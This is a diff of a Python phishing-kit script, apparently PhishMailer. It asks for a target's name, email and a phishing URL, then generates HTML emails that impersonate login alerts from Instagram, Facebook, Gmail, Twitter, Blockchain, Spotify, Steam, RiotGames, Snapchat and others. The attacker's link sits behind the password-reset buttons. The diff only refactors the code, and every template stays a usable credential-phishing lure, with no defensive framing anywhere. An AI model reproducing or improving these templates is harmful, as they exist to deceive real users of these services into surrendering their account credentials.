@@ -1,18 +1,15 @@
 import os 
 import sys
 
-red = ("\033[1;31;40m")
-green = ("\033[1;32;40m")
-white = ("\033[1;37;40m")
-
-start = (green + "[" + white + "+" + green + "]" + white)
-alert = (green + "[" + red + "!" + green + "]" + white)
+from Core.helper.date import monthName
+from Core.helper.color import green, white, blue, start, alert, numbering
 
 def Instagram():
 	Target = input(start + " Enter Target Name: ")
 	TargetAccount = input(start + " Enter Target Account Name: ")
 	url = input(start + " Enter Phishing Url: ")
 	TargetEmail = input(start + " Enter Target Email: ")
+	
 	instagram = ("""
 	<div dir="ltr" style="margin: 0; padding: 0;">
 	<table id="m_-7319109037895721555email_table" style="border-collapse: collapse;" border="0" width="100%;" cellspacing="0" cellpadding="0">
@@ -136,12 +133,14 @@ def Instagram():
 	</tbody>
 	</table>
 	</div>""".format(Target, TargetAccount, url, Target, TargetEmail))
+	
 	filename = input(start + " Enter Name On HTML File: ")
 	TXTname = input(start + " Enter Name On Text file (.txt): ")
 	Html_file = open(filename + ".html","w")
 	Html_file.write(instagram)
 	Html_file.close()
 	print(alert + " HTML File Created")
+	
 	TXT_file = open(TXTname + ".txt","w")
 	TXT_file.write(instagram)
 	TXT_file.close()
@@ -152,6 +151,7 @@ def Facebook():
 	TargetEmail = input(start + " Enter Target Email: " + white)
 	phishURL = input(start + " Enter Phishing URL: " + white)
 	Date = int(input(start + " Enter a number as date: " + white))
+	
 	print("")
 	print(start + green + "Enter Month When Login Happend")
 	print(green + "[" + white + "1" + green + "]" + white + " January")
@@ -167,36 +167,7 @@ def Facebook():
 	print(green + "[" + white + "11" + green + "]" + white + " November")
 	print(green + "[" + white + "12" + green + "]" + white + " December")
 	monthpick = int(input(green + "root@phishmailer/month:~ "))
-	
-	if monthpick == 1:
-		month = ("January")
-	elif monthpick == 2:
-		month = ("February")
-	elif monthpick == 3:
-		month = ("March")
-	elif monthpick == 4:
-		month = ("April")
-	elif monthpick == 5:
-		month = ("May")
-	elif monthpick == 6:
-		month = ("June")
-	elif monthpick == 7:
-		month = ("July")
-	elif monthpick == 8:
-		month = ("August")
-	elif monthpick == 9:
-		month = ("September")
-	elif monthpick == 10:
-		month ("October")
-	elif monthpick == 11:
-		month = ("November")
-	elif month == 12:
-		month = ("December")
-	else:
-		print(alert + " Error")
-		time.sleep(1)
-		print("Exiting")
-		sys.exit()
+	month = monthName(monthpick)
 	
 	print("")
 	year = int(input(start + " Enter Year: "))
@@ -215,6 +186,7 @@ def Facebook():
 	Html_file.write(facebook)
 	Html_file.close()
 	print(alert + " HTML File Created")
+	
 	TXT_file = open(TXTname + ".txt","w")
 	TXT_file.write(facebook)
 	TXT_file.close()
@@ -227,56 +199,29 @@ def Gmail():
 	Date = input(start + " Enter Date: " + white)
 	Year = input(start + " Enter Year: " + white)
 	Time = input(start + " Enter Time (Example, 10:00 pm/am): " + white)
+	
 	print("")
 	print(start + "Enter Month When Login Happend")
-	print(green + "[" + white + "1" + green + "]" + white + " January")
-	print(green + "[" + white + "2" + green + "]" + white + " February")
-	print(green + "[" + white + "3" + green + "]" + white + " March")
-	print(green + "[" + white + "4" + green + "]" + white + " April")
-	print(green + "[" + white + "5" + green + "]" + white + " May")
-	print(green + "[" + white + "6" + green + "]" + white + " June")
-	print(green + "[" + white + "7" + green + "]" + white + " July")
-	print(green + "[" + white + "8" + green + "]" + white + " August")
-	print(green + "[" + white + "9" + green + "]" + white + " September")
-	print(green + "[" + white + "10" + green + "]" + white + " October")
-	print(green + "[" + white + "11" + green + "]" + white + " November")
-	print(green + "[" + white + "12" + green + "]" + white + " December")
+	print(numbering(1) + white + " January")
+	print(numbering(2) + white + " February")
+	print(numbering(3) + white + " March")
+	print(numbering(4) + white + " April")
+	print(numbering(5) + white + " May")
+	print(numbering(6) + white + " June")
+	print(numbering(7) + white + " July")
+	print(numbering(8) + white + " August")
+	print(numbering(9) + white + " September")
+	print(numbering(10) + white + " October")
+	print(numbering(11) + white + " November")
+	print(numbering(12) + white + " December")
 	monthpick = int(input(green + "root@phishmailer:~ " + white))
+	
 	print("")
 	Country = input(start + " Enter Country: " + white)
 	City = input(start + " Enter A City: " + white)
 	PhishUrl = input(start + " Enter A Phishing Url: " + white)
-	
-	if monthpick == 1:
-		month = ("January")
-	elif monthpick == 2:
-		month = ("February")
-	elif monthpick == 3:
-		month = ("March")
-	elif monthpick == 4:
-		month = ("April")
-	elif monthpick == 5:
-		month = ("May")
-	elif monthpick == 6:
-		month = ("June")
-	elif monthpick == 7:
-		month = ("July")
-	elif monthpick == 8:
-		month = ("August")
-	elif monthpick == 9:
-		month = ("September")
-	elif monthpick == 10:
-		month ("October")
-	elif monthpick == 11:
-		month = ("November")
-	elif month == 12:
-		month = ("December")
-	else:
-		print(alert + " Error")
-		time.sleep(1)
-		print("Exiting")
-		sys.exit()
-		
+	month = monthName(monthpick)
+
 	Gmail = ("""<table style="min-width: 348px; width: 100%; height: 100%;" border="0" cellspacing="0" cellpadding="0">
 	<tbody>
 	<tr align="center">
@@ -414,6 +359,7 @@ def Gmail():
 	Html_file.write(Gmail)
 	Html_file.close()
 	print(alert + " HTML File Created")
+	
 	TXT_file = open(TXTname + ".txt","w")
 	TXT_file.write(Gmail)
 	TXT_file.close()
@@ -428,14 +374,14 @@ def Twitter():
 	MustContain = input(start + " Your Url Contains (Word In Domain): ")
 	Extension = input(start + " Your Enter Your Domain (Example '.com'): ")
 	twitter = ("""<div bgcolor="#F5F8FA" style="margin:0;padding:0"><table cellpadding="0" cellspacing="0" border="0" width="100%" bgcolor="#F5F8FA" style="background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px" class="m_7210276772504823937body_wrapper"><tbody><tr><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table class="m_7210276772504823937collapse" id="m_7210276772504823937header" align="center" width="448" style="width:448px;padding:0;margin:0;line-height:1px;font-size:1px" bgcolor="#ffffff" cellpadding="0" cellspacing="0" border="0"><tbody><tr><td style="min-width:448px;padding:0;margin:0;line-height:1px;font-size:1px" class="m_7210276772504823937cut"> <img src="https://ci5.googleusercontent.com/proxy/dZihfURYMr4ltOGMmSu7g3JXn4x0ue5ctCYAEwZ-rv1Lx8G77mg5v7CCPyDYzWr4uj2cpj6-5f0-LRFTlHdmZ14PL7dREA1lSKWeXxIwyQjf9Bdb1yJ3JcrK=s0-d-e1-ft#https://ea.twimg.com/email/self_serve/media/spacer-1402696023930.png" style="min-width:448px;height:1px;margin:0;padding:0;display:block;border:none;outline:none" class="CToWUd"> </td></tr></tbody></table> </td></tr><tr><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table class="m_7210276772504823937collapse" id="m_7210276772504823937header" align="center" width="448" style="width:448px;background-color:#ffffff;padding:0;margin:0;line-height:1px;font-size:1px" bgcolor="#ffffff" cellpadding="0" cellspacing="0" border="0"><tbody><tr><td colspan="3" height="24" style="height:24px;padding:0;margin:0;line-height:1px;font-size:1px" class="m_7210276772504823937logo_space"> &nbsp; </td></tr><tr align="right"><td width="24" class="m_7210276772504823937margin" style="padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="right" style="padding:0;margin:0;line-height:1px;font-size:1px"> <a href="#m_7210276772504823937_" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0"> <img width="32" align="right" src="https://ci6.googleusercontent.com/proxy/7uJiuTOo6rMk0ahEnEhjXzhKVdtkt-IgM_uCWBYJd8SjMK2uFYPnfc9tFTdYP-OAHBQWBjjS-gNGUpaW67od9X37iuyFD32VfvDGDyXB1DDj-o0HyZXQdxkFn8uPO3ydU9rPwA=s0-d-e1-ft#https://ea.twimg.com/email/self_serve/media/Twitter_logo_180-1468901451975.png" style="width:32px;margin:0;padding:0;display:block;border:none;outline:none" class="CToWUd"> </a> </td><td width="24" class="m_7210276772504823937margin" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td colspan="4" height="24" style="height:24px;padding:0;margin:0;line-height:1px;font-size:1px" class="m_7210276772504823937logo_space"> <img width="1" height="1" style="display:block;margin:0;padding:0;display:block;border:none;outline:none" src="https://ci6.googleusercontent.com/proxy/DcPlfaEWAKqTloO57NjmsI2d7aQm9ZJE7V1xVBepiu2RDkg2ScBv6cld0fmGgPGWqlUp2IghtFNnNIr7ap2zdki9k3RW8ftVByQdeahXNIPYHI4WNspFWCV3oCaqQlH8XsU7lG9hTHrZwYJZ_LgibzX_SE10SkLb7KMvaZDd-zrTpRqBQTwZKEa8ZknEgYHIZdakbg=s0-d-e1-ft#https://twitter.com/scribe/ibis?t=1&amp;cn=bG9naW5fbm90aWZpY2F0aW9u&amp;iid=d245d496e25743259b05c4aeaf0b44cf&amp;uid=2356568077&amp;nid=244+20" class="CToWUd"> </td></tr></tbody></table><table class="m_7210276772504823937collapse" id="m_7210276772504823937header" align="center" width="448" style="width:448px;background-color:#ffffff;padding:0;margin:0;line-height:1px;font-size:1px" bgcolor="#ffffff" cellpadding="0" cellspacing="0" border="0"><tbody><tr align="left;"><td width="24" class="m_7210276772504823937margin" style="padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="left;" style="padding:0;margin:0;line-height:1px;font-size:1px"><table class="m_7210276772504823937collapse" cellpadding="0" cellspacing="0" border="0" style="padding:0;margin:0;line-height:1px;font-size:1px"><tbody><tr><td align="left;" class="m_7210276772504823937h2" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:24px;line-height:32px;font-weight:bold;color:#292f33;text-align:left;text-decoration:none"> We noticed a recent login for your account <a href="" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;color:#292f33;text-decoration:none" target="_blank">{}</a>. </td></tr><tr><td height="24" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td style="padding:0;margin:0;line-height:1px;font-size:1px"><table width="100%" align="center" cellspacing="0" border="0" class="m_7210276772504823937collapse" style="padding:0;margin:0;line-height:1px;font-size:1px"><tbody><tr><td width="30" style="width:30px;padding:0;margin:0;line-height:1px;font-size:1px" class="m_7210276772504823937margins"></td><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table width="100%" align="center" cellpadding="0" cellspacing="0" border="0" class="m_7210276772504823937collapse" style="padding:0;margin:0;line-height:1px;font-size:1px"><tbody><tr><td align="left" width="25%" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"><strong>Device</strong></td><td width="15" style="width:15px;padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="left" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none">Chrome on Android</td></tr><tr><td align="left" width="25%" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"><strong>Location</strong></td><td width="15" style="width:15px;padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="left" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none">Near {}, {}</td></tr></tbody></table> </td></tr></tbody></table> </td></tr><tr><td height="24" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="left" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> <strong>If this was you:</strong> </td></tr><tr><td height="6" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="left" class="m_7210276772504823937body-text" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:16px;line-height:20px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> Great! There's nothing else you need to do. </td></tr><tr><td height="24" style="height:24px;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="left;" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> <strong>If this wasn’t you:</strong> </td></tr><tr><td height="6" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="left;" class="m_7210276772504823937body-text" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:16px;line-height:20px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> Your account may have been compromised and you should take a few steps to make sure your account is secure. To start, <a href="{}" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;border:none;text-decoration:none;font-weight:400;color:#1da1f2" target="_blank">reset your password now</a>. </td></tr><tr><td height="36" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr></tbody></table> </td><td width="24" class="m_7210276772504823937margin" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table width="100%" align="center" cellpadding="0" cellspacing="0" border="0" class="m_7210276772504823937edu-module" style="padding:0;margin:0;line-height:1px;font-size:1px;background-color:#ffffff;border-radius:5px"><tbody><tr><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr></tbody></table> </td><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td colspan="3" height="24" class="m_7210276772504823937edu-space" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td width="24" class="m_7210276772504823937edu-margins" style="padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table width="100%" align="center" cellpadding="0" cellspacing="0" border="0" class="m_7210276772504823937edu-module" bgcolor="#F5F8FA" style="padding:0;margin:0;line-height:1px;font-size:1px;background-color:#ffffff;border-radius:5px"><tbody><tr><td align="left" style="padding:0;margin:0;line-height:1px;font-size:1px"><table border="0" cellpadding="0" cellspacing="0" width="100%" style="padding:0;margin:0;line-height:1px;font-size:1px"><tbody><tr><td class="m_7210276772504823937edu-header" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;font-size:16px;line-height:22px;text-align:left;color:#8899a6"> <strong>How do I know an email is from <span class="il">Twitter</span>?</strong> </td></tr><tr><td colspan="3" height="12" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td class="m_7210276772504823937edu-text" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:19px;font-weight:400;text-align:left;color:#8899a6"> Links in this email will start with “<span class="m_7210276772504823937no-link"><a href="#m_7210276772504823937_" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;color:#8899a6;text-decoration:none">https://</a></span>” and contain “<span class="m_7210276772504823937no-link"><a href="{}" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;color:#8899a6;text-decoration:none" target="_blank" data-saferedirecturl="https://www.google.com/url?hl=en&amp;q=https://twitter.com/i/redirect?url%3Dhttps%253A%252F%252Ftwitter.com%252F%253Frefsrc%253Demail%26t%3D1%26cn%3DbG9naW5fbm90aWZpY2F0aW9u%26sig%3D5810b2be86b6d2764512337d9cf3ea4d02812789%26iid%3Dd245d496e25743259b05c4aeaf0b44cf%26uid%3D2356568077%26nid%3D244%2B1554&amp;source=gmail&amp;ust=1488768499007000&amp;usg=AFQjCNFX5GJTsk-lhQbDIpjXZSXB0zgDlQ"><span class="il">{}</span>{}</a></span>.” Your browser will also display a padlock icon to let you know a site is secure. </td></tr></tbody></table> </td></tr></tbody></table> </td><td width="24" class="m_7210276772504823937edu-margins" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td colspan="3" height="24" class="m_7210276772504823937edu-space" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table width="100%" align="center" cellpadding="0" cellspacing="0" border="0" class="m_7210276772504823937edu-module" style="padding:0;margin:0;line-height:1px;font-size:1px;background-color:#ffffff;border-radius:5px"><tbody><tr><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr></tbody></table> </td><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr></tbody></table><table class="m_7210276772504823937collapse" id="m_7210276772504823937footer" align="center" width="448" style="width:448px;background-color:#ffffff;padding:0;margin:0;line-height:1px;font-size:1px" cellpadding="0" cellspacing="0" border="0"><tbody><tr><td height="36" style="height:36px;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"> <span class="m_7210276772504823937small-copy" style="font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none"> <a href="https://support.twitter.com/articles/76036" class="m_7210276772504823937small-copy" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:600;color:#1da1f2;text-align:left;text-decoration:none" target="_blank" data-saferedirecturl="https://www.google.com/url?hl=en&amp;q=https://support.twitter.com/articles/76036&amp;source=gmail&amp;ust=1488768499007000&amp;usg=AFQjCNHUCzbUjXfmNAT0B7wamPYK6mFWjQ">Help</a> &nbsp;|&nbsp; <a href="https://twitter.com/i/redirect?url=https%3A%2F%2Fsupport.twitter.com%2Farticles%2F204820-fake-twitter-emails&amp;t=1&amp;cn=bG9naW5fbm90aWZpY2F0aW9u&amp;sig=ee6d8d5439b23c101a3694be6e6989a2ffa94c79&amp;iid=d245d496e25743259b05c4aeaf0b44cf&amp;uid=2356568077&amp;nid=244+1558" class="m_7210276772504823937small-copy" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:600;color:#1da1f2;text-align:left;text-decoration:none" target="_blank" data-saferedirecturl="https://www.google.com/url?hl=en&amp;q=https://twitter.com/i/redirect?url%3Dhttps%253A%252F%252Fsupport.twitter.com%252Farticles%252F204820-fake-twitter-emails%26t%3D1%26cn%3DbG9naW5fbm90aWZpY2F0aW9u%26sig%3Dee6d8d5439b23c101a3694be6e6989a2ffa94c79%26iid%3Dd245d496e25743259b05c4aeaf0b44cf%26uid%3D2356568077%26nid%3D244%2B1558&amp;source=gmail&amp;ust=1488768499007000&amp;usg=AFQjCNHriReOKYKBFgrb1BXxDnBgMcj2aA">Email security tips</a> </span> </td></tr><tr><td height="12" style="height:12px;line-height:1px;font-size:1px;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"> <span class="m_7210276772504823937small-copy" style="font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none"> This email was meant for {}</span> </td></tr><tr><td height="6" style="height:6px;line-height:1px;font-size:1px;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"> <span class="m_7210276772504823937address"> <a href="#m_7210276772504823937_" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;color:#8899a6;font-size:12px;padding:0px;margin:0px;font-weight:normal;line-height:12px"><span class="il">Twitter</span>, Inc. 1355 Market Street, Suite 900 San Francisco, CA 94103</a> </span> </td></tr><tr><td height="72" style="height:72px;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr></tbody></table> </td></tr></tbody></table><div class="yj6qo"></div><div class="adL"></div></div>""".format(AccountName, City, Country, PhishUrl, PhishUrl, MustContain, Extension, TargetName))
-	
-	
+
 	filename = input(start + " Enter Name On HTML File: ")
 	TXTname = input(start + " Enter Name On Text file (.txt): ")
 	Html_file = open(filename + ".html","w")
 	Html_file.write(twitter)
 	Html_file.close()
 	print(alert + " HTML File Created")
+	
 	TXT_file = open(TXTname + ".txt","w")
 	TXT_file.write(twitter)
 	TXT_file.close()
@@ -490,6 +436,7 @@ def AskFM():
 	Html_file.write(ask)
 	Html_file.close()
 	print(alert + " HTML File Created")
+	
 	TXT_file = open(TXTname + ".txt","w")
 	TXT_file.write(ask)
 	TXT_file.close()
@@ -498,7 +445,7 @@ def AskFM():
 def Blockchain():
 	phishingurl = input(start + " Enter Your PhishingURL: ")
 	
-	sourceCode = ("""
+	sourcecode = ("""
 	<div style="color: transparent; visibility: hidden; opacity: 0; font-size: 0px; border: 0; max-height: 1px; width: 1px; margin: 0px; padding: 0px; border-width: 0px!important; display: none!important; line-height: 0px!important;"><img src="http://go.sparkpostmail2.com/q/Q7tsiXTRYQG7SEDvizET-g~~/AAP1OAA~/RgRgcaotPVcDc3BjQgoAKi0lj17Xt8P6UhViaXprZW5AcHJvdG9ubWFpbC5jb21YBAAAAAA~" width="1" height="1" border="0" /></div>
 	<p><span style="color: transparent; visibility: hidden; display: none; opacity: 0; height: 0; width: 0; font-size: 0;">Whether for filing taxes or simply for your own records, you can now download your transaction history as a CSV.</span><img style="border: 0; width: 1px; height: 1px; border-width: 0px!important; display: none!important; line-height: 0!important;" src="http://links.blockchain.com/e/eo?_t=b077a02c6d894ec28e56236cee81e43a&amp;_m=72a52e96a6a74b70850eec468ada1374&amp;_e=lPfbQA3SIQ7hISMt9H7G0NypCD_6FLhliEbdOmCO-NGLfXR96pBl4HW95MZyyhoFNTSOLnZ64-9Y7onhzSmdiYIf5ODjBxJxT_TJHbaJfmtbBTPuu72vhqYHjTOpp16nkYlWwSXv2acjsrpbF-WBySlSokSBpK4pqxCMPho__FA%3D" width="1" height="1" /></p>
 	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; padding: 12px; background-color: #ffffff;">
@@ -855,6 +802,7 @@ def Blockchain():
 	Html_file.write(sourcecode)
 	Html_file.close()
 	print(alert + " HTML File Created")
+	
 	TXT_file = open(TXTname + ".txt","w")
 	TXT_file.write(sourcecode)
 	TXT_file.close()
@@ -1162,7 +1110,7 @@ def Dreamteam():
 	<img style="display:block;width:1px!important;min-width:1px!important;max-width:1px!important;height:1px!important;border:0;overflow:hidden" src="https://dreamteam21599.emlnk1.com/lt.php?nl=2&amp;c=202&amp;m=340&amp;s=ed8fa103941dbfb0cd8442bbd9a8c886&amp;l=open" width="1" height="1" border="0"><br clear="all"></div>
 
 
-	</div></div>""".format(username, url, url, url))
+	</div></div>""".format(username, url, url))
 
 	filename = input(start + " Enter Name On HTML File: ")
 	TXTname = input(start + " Enter Name On Text file (.txt): ")
@@ -1170,6 +1118,7 @@ def Dreamteam():
 	Html_file.write(dream)
 	Html_file.close()
 	print(alert + " HTML File Created")
+	
 	TXT_file = open(TXTname + ".txt","w")
 	TXT_file.write(dream)
 	TXT_file.close()
@@ -1238,6 +1187,7 @@ def GmailActivity():
 	Html_file.write(sourcecode)
 	Html_file.close()
 	print(alert + " HTML File Created")
+	
 	TXT_file = open(TXTname + ".txt","w")
 	TXT_file.write(sourcecode)
 	TXT_file.close()
@@ -1348,6 +1298,7 @@ def Rockstar():
 	Html_file.write(sourcecode)
 	Html_file.close()
 	print(alert + " HTML File Created")
+	
 	TXT_file = open(TXTname + ".txt","w")
 	TXT_file.write(sourcecode)
 	TXT_file.close()
@@ -1404,6 +1355,7 @@ def AskFm():
 	Html_file.write(source)
 	Html_file.close()
 	print(alert + " HTML File Created")
+	
 	TXT_file = open(TXTname + ".txt","w")
 	TXT_file.write(source)
 	TXT_file.close()
@@ -1546,6 +1498,7 @@ def Webhost000():
 	Html_file.write(source)
 	Html_file.close()
 	print(alert + " HTML File Created")
+	
 	TXT_file = open(TXTname + ".txt","w")
 	TXT_file.write(source)
 	TXT_file.close()
@@ -1911,6 +1864,7 @@ def Blockchain():
 	Html_file.write(source)
 	Html_file.close()
 	print(alert + " HTML File Created")
+	
 	TXT_file = open(TXTname + ".txt","w")
 	TXT_file.write(source)
 	TXT_file.close()
@@ -1922,6 +1876,7 @@ def Spotify():
 	Country = input(start + " Enter Country: ")
 	City = input(start + " Enter City: ")
 	Date = input(start + " Enter Date: ")
+	
 	print("")
 	print(start + " Enter Month When Login Happend")
 	print(green + "[" + white + "1" + green + "]" + white + " January")
@@ -1938,36 +1893,7 @@ def Spotify():
 	print(green + "[" + white + "12" + green + "]" + white + " December")
 	print("")
 	monthpick = int(input(green + "root@phishmailer/month:~ " + white))
-	
-	if monthpick == 1:
-		month = ("January")
-	elif monthpick == 2:
-		month = ("February")
-	elif monthpick == 3:
-		month = ("March")
-	elif monthpick == 4:
-		month = ("April")
-	elif monthpick == 5:
-		month = ("May")
-	elif monthpick == 6:
-		month = ("June")
-	elif monthpick == 7:
-		month = ("July")
-	elif monthpick == 8:
-		month = ("August")
-	elif monthpick == 9:
-		month = ("September")
-	elif monthpick == 10:
-		month ("October")
-	elif monthpick == 11:
-		month = ("November")
-	elif month == 12:
-		month = ("December")
-	else:
-		print(alert + " Error")
-		time.sleep(1)
-		print(alert + " Exiting")
-		sys.exit()
+	month = monthName(monthpick)
 	
 	print("")
 	Time = input(start + " Enter Time (example 11:45:17): ")
@@ -2163,6 +2089,7 @@ def Spotify():
 	Html_file.write(source)
 	Html_file.close()
 	print(alert + " HTML File Created")
+	
 	TXT_file = open(TXTname + ".txt","w")
 	TXT_file.write(source)
 	TXT_file.close()
@@ -2478,6 +2405,7 @@ def Dreamteam():
 	Html_file.write(source)
 	Html_file.close()
 	print(alert + " HTML File Created")
+	
 	TXT_file = open(TXTname + ".txt","w")
 	TXT_file.write(source)
 	TXT_file.close()
@@ -2486,6 +2414,7 @@ def Dreamteam():
 def RiotGames():
 	username = input(start + " Enter Target Username: ")
 	Url = input(start + " Enter Your PhishingUrl: ")
+	
 	print("")
 	print(start + " Pick A Server Your Target Is Having His RiotGames Account On")
 	print(green + "[" + white + "1" + green + "]" + white + "    »" + blue + " Brazil (BR)" + white + " «")
@@ -2690,6 +2619,7 @@ def RiotGames():
 	Html_file.write(source)
 	Html_file.close()
 	print(alert + " HTML File Created")
+	
 	TXT_file = open(TXTname + ".txt","w")
 	TXT_file.write(source)
 	TXT_file.close()
@@ -2780,6 +2710,7 @@ def Steam():
 	Html_file.write(source)
 	Html_file.close()
 	print(alert + " HTML File Created")
+	
 	TXT_file = open(TXTname + ".txt","w")
 	TXT_file.write(source)
 	TXT_file.close()
@@ -3150,6 +3081,7 @@ def Gamehag():
 	Html_file.write(source)
 	Html_file.close()
 	print(alert + " HTML File Created")
+	
 	TXT_file = open(TXTname + ".txt","w")
 	TXT_file.write(source)
 	TXT_file.close()
@@ -3235,6 +3167,7 @@ def SnapchatSimple():
 	Html_file.write(source)
 	Html_file.close()
 	print(alert + " HTML File Created")
+	
 	TXT_file = open(TXTname + ".txt","w")
 	TXT_file.write(source)
 	TXT_file.close()
